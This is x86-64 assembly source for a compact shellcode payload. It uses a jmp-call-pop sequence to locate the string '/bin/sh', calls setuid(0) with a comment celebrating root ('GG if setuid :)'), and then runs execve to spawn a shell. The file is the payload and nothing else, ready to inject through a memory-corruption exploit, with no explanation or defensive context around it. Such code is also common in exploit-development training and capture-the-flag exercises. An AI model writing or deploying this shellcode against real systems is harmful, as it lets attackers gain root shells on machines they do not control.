section .data 
section .bss
section .text

global _start

_start:
    jmp shellString
pwn:
    ; setuid(0) - GG if setuid :)
    xor rax, rax
    xor rdi, rdi
    mov al, 0x69
    syscall

    ; execve("/bin/sh", 0x0, 0x0)
    xor rax, rax
    xor rdx, rdx
    xor rsi, rsi
    xor rcx, rcx
    mov al, 0x3B
    pop rdi
    mov rdi, [rdi]
    push rdi
    push rsp
    pop rdi
    mov BYTE [rdi + 7], cl
    syscall

shellString:
    call pwn
    sh dq "/bin/sh"

